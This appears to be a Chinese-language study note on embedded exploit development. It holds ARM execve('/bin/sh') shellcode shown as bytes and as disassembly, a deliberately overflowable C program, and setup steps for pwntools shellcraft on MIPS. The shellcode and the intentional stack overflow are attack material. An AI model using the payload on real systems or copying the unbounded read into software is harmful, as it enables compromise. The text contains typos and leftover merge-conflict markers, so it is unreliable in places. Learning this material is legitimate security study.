ROM:00000000 ; ARM architecture: metaarm
ROM:00000000 ; Target assembler: Generic assembler for ARM
ROM:00000000 ; Byte sex        : Little endian
ROM:00000000
ROM:00000000 ; ===========================================================================
ROM:00000000
ROM:00000000 ; Segment type: Pure code
ROM:00000000                 AREA ROM, CODE, READWRITE, ALIGN=0
ROM:00000000                 CODE32
ROM:00000000                 DCB 0x68 ; h
ROM:00000001                 DCB 0x70 ; p
ROM:00000002                 DCB    0
ROM:00000003                 DCB 0xE3
ROM:00000004                 DCB 0x41 ; A
ROM:00000005                 DCB 0x71 ; q
ROM:00000006                 DCB 0x44 ; D
ROM:00000007                 DCB 0xE3
ROM:00000008                 DCB    4
ROM:00000009                 DCB 0x70 ; p
ROM:0000000A                 DCB 0x2D ; -
ROM:0000000B                 DCB 0xE5
ROM:0000000C                 DCB 0x2F ; /
ROM:0000000D                 DCB 0x7F ; 
ROM:0000000E                 DCB    2
ROM:0000000F                 DCB 0xE3
ROM:00000010                 DCB 0x2F ; /
ROM:00000011                 DCB 0x73 ; s
ROM:00000012                 DCB 0x47 ; G
ROM:00000013                 DCB 0xE3
ROM:00000014                 DCB    4
ROM:00000015                 DCB 0x70 ; p
ROM:00000016                 DCB 0x2D ; -
ROM:00000017                 DCB 0xE5
ROM:00000018                 DCB 0x2F ; /
ROM:00000019                 DCB 0x72 ; r
ROM:0000001A                 DCB    6
ROM:0000001B                 DCB 0xE3
ROM:0000001C                 DCB 0x69 ; i
ROM:0000001D                 DCB 0x7E ; ~
ROM:0000001E                 DCB 0x46 ; F
ROM:0000001F                 DCB 0xE3
ROM:00000020                 DCB    4
ROM:00000021                 DCB 0x70 ; p
ROM:00000022                 DCB 0x2D ; -
ROM:00000023                 DCB 0xE5
ROM:00000024                 DCB  0xD
ROM:00000025                 DCB    0
ROM:00000026                 DCB 0xA0
ROM:00000027                 DCB 0xE1
ROM:00000028                 DCB 0x73 ; s
ROM:00000029                 DCB 0x78 ; x
ROM:0000002A                 DCB    6
ROM:0000002B                 DCB 0xE3
ROM:0000002C                 DCB    4
ROM:0000002D                 DCB 0x70 ; p
ROM:0000002E                 DCB 0x2D ; -
ROM:0000002F                 DCB 0xE5
ROM:00000030                 DCB  0xC
ROM:00000031                 DCB 0xC0
ROM:00000032                 DCB 0x2C ; ,
ROM:00000033                 DCB 0xE0
ROM:00000034                 DCB    4
ROM:00000035                 DCB 0xC0
ROM:00000036                 DCB 0x2D ; -
ROM:00000037                 DCB 0xE5
ROM:00000038                 DCB    4
ROM:00000039                 DCB 0x10
ROM:0000003A                 DCB 0xA0
ROM:0000003B                 DCB 0xE3
ROM:0000003C                 DCB  0xD
ROM:0000003D                 DCB 0x10
ROM:0000003E                 DCB 0x81
ROM:0000003F                 DCB 0xE0
ROM:00000040                 DCB    1
ROM:00000041                 DCB 0xC0
ROM:00000042                 DCB 0xA0
ROM:00000043                 DCB 0xE1
ROM:00000044                 DCB    4
ROM:00000045                 DCB 0xC0
ROM:00000046                 DCB 0x2D ; -
ROM:00000047                 DCB 0xE5
ROM:00000048                 DCB  0xD
ROM:00000049                 DCB 0x10
ROM:0000004A                 DCB 0xA0
ROM:0000004B                 DCB 0xE1
ROM:0000004C                 DCB    2
ROM:0000004D                 DCB 0x20
ROM:0000004E                 DCB 0x22 ; "
ROM:0000004F                 DCB 0xE0
ROM:00000050                 DCB  0xB
ROM:00000051                 DCB 0x70 ; p
ROM:00000052                 DCB 0xA0
ROM:00000053                 DCB 0xE3
ROM:00000054                 DCB    0
ROM:00000055                 DCB    0
ROM:00000056                 DCB    0
ROM:00000057                 DCB 0xEF
ROM:00000057 ; ROM           ends
```

点击seg000:00000000这块，然后按C反汇编

```asm
ROM:00000000 ; Processor       : ARM
ROM:00000000 ; ARM architecture: metaarm
ROM:00000000 ; Target assembler: Generic assembler for ARM
ROM:00000000 ; Byte sex        : Little endian
ROM:00000000
ROM:00000000 ; ===========================================================================
ROM:00000000
ROM:00000000 ; Segment type: Pure code
ROM:00000000                 AREA ROM, CODE, READWRITE, ALIGN=0
ROM:00000000                 CODE32
ROM:00000000                 MOV             R7, #0x41410068
ROM:00000008                 PUSH            {R7}
ROM:0000000C                 MOV             R7, #0x732F2F2F
ROM:00000014                 PUSH            {R7}
ROM:00000018                 MOV             R7, #0x6E69622F
ROM:00000020                 PUSH            {R7}
ROM:00000024                 MOV             R0, SP
ROM:00000028                 MOVW            R7, #0x6873
ROM:0000002C                 PUSH            {R7}
ROM:00000030                 EOR             R12, R12, R12
ROM:00000034                 PUSH            {R12}
ROM:00000038                 MOV             R1, #4
ROM:0000003C                 ADD             R1, R1, SP
ROM:00000040                 MOV             R12, R1
ROM:00000044                 PUSH            {R12}
ROM:00000048                 MOV             R1, SP
ROM:0000004C                 EOR             R2, R2, R2
ROM:00000050                 MOV             R7, #0xB
ROM:00000054                 SVC             0
ROM:00000054 ; ROM           ends
ROM:00000054
ROM:00000054                 END
```



## 漏洞利用开发过程

* 劫持PC
* 确定偏移
* 确定攻击途径
* 构建漏洞攻击数据

下面是一个有漏洞的程序：vuln_system.c

```c
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

void do_system(int code, char * cmd) {
    char buf[255];
    system(cmd);
}

void main() {
    char buf[256] = {0};
    char ch;
    int count = 0;
    unsigned int fileLen = 0;
    strcut stat fileData;
    FILE *fp;
    if (0 == stat("passwd", &fileData)) {
        fileLen = fileData.st_size;
    }
    else {
        return 1;
    }
    if ((fp = fopen("passwd", "rb")) == NULL) {
        printf("Cannot open file passwd!\n");
        exit(1);
    }
    ch = fgetc(fp);
    while(count <= fileLen) {
        buf[count++] = ch;
        ch = fgetc(fp);
    }
    buf[--count] = '\x00';

    if (!strcmp(buf, "adminpwd")) {
        do_system(count, "ls -l");
    }
    else {
        printf("you have an invalid password!\n");
    }
    fclose(fp);
}
```





# 基于MIPS的Shellcode

## binutils

因为要使用pwntools生成不同架构下的shellcode，也就是shellcraft这个模块，所以需要安装pwntools的[binutils](https://github.com/Gallopsled/pwntools-binutils/)，以编译对应架构下的机器码。这里说一下pwntools的shellcraft模块，这个模块的文档可以参考：[pwnlib.shellcraft](http://docs.pwntools.com/en/latest/shellcraft.html)。平时我们比较常用的是`shellcraft.sh()`，这里没有指明目标架构是因为一般我们在context中已经指定，所以不需要重复指定。如果不指定直接使用`shellcraft.sh()`，这是默认i386的指令集。

[Binutils ? pwntools 4.7.0 documentation](https://docs.pwntools.com/en/stable/install/binutils.html)

### Ubuntu下安装binutils

```sh
apt-get install software-properties-common
apt-add-repository ppa:pwntools/binutils
apt-get update
apt-get install binutils-$ARCH-linux-gnu
```

### MACOS下安装binutils

```sh
brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/macos/binutils-$ARCH.rb
```



<<<<<<< HEAD
>>>>>>> 0505b64c38087f21190a92fc914cae0b88619cfc
=======
>>>>>>> 0505b64c38087f21190a92fc914cae0b88619cfc
